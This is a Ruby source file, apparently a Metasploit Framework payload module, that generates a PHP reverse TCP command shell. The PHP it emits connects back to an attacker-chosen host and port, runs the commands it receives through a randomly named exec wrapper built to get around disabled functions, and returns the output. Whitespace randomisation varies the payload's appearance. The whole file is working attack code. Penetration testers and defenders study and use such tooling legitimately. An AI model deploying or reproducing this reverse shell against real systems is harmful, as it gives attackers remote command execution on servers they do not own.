##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'


module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Reverse TCP (via php)',
			'Version'       => '$Revision$',
			'Description'   => 'Reverse PHP connect back shell with checks for disabled functions',
			'Author'        => 'egypt <egypt@nmt.edu>',
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Issues
	#   - Since each command is executed in a new shell, 'cd' does nothing.
	#      Perhaps it should be special-cased to call chdir()
	#   - Tries to get around disable_functions but makes no attempts to 
	#      circumvent safe mode.  
	#
	def php_reverse_shell

		if (!datastore['LHOST'] or datastore['LHOST'].empty?)
			# datastore is empty on msfconsole startup
			ipaddr = 0x7f000001
			port = 4444
		else
			ipaddr = datastore['LHOST'].split(/\./).map{|c| c.to_i}.pack("C*").unpack("N").first
			port = datastore['LPORT']
		end
		exec_funcname = Rex::Text.rand_text_alpha(rand(10)+5)

		shell=<<-END_OF_PHP_CODE
		$ipaddr=long2ip(#{ipaddr});
		$port=#{port};
		#{php_preamble({:disabled_varname => "$dis"})}

		if(!function_exists('#{exec_funcname}')){
			function #{exec_funcname}($c){
				global$dis;
				#{php_system_block({:cmd_varname => "$c", :disabled_varname => "$dis", :output_varname => "$o"})}
				return$o;
			}
		}
		$nofuncs='no exec functions';
		if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){
			$s=@fsockopen($ipaddr,$port);
			while($c=fread($s,2048)){
				$out=#{exec_funcname}(substr($c,0,-1));
				if($out===false){
					fwrite($s,$nofuncs);
					break;
				}
				fwrite($s,$out);
			}
			fclose($s);
		}else{
			$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
			@socket_connect($s,$ipaddr,$port);
			@socket_write($s,"socket_create");
			while($c=@socket_read($s,2048)){
				$out=#{exec_funcname}(substr($c,0,-1));
				if($out===false){
					@socket_write($s,$nofuncs);
					break;
				}
				@socket_write($s,$out,strlen($out));
			}
			@socket_close($s);
		}
		END_OF_PHP_CODE

		# randomize the spaces a bit
		Rex::Text.randomize_space(shell)

		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return super + php_reverse_shell
	end
	
end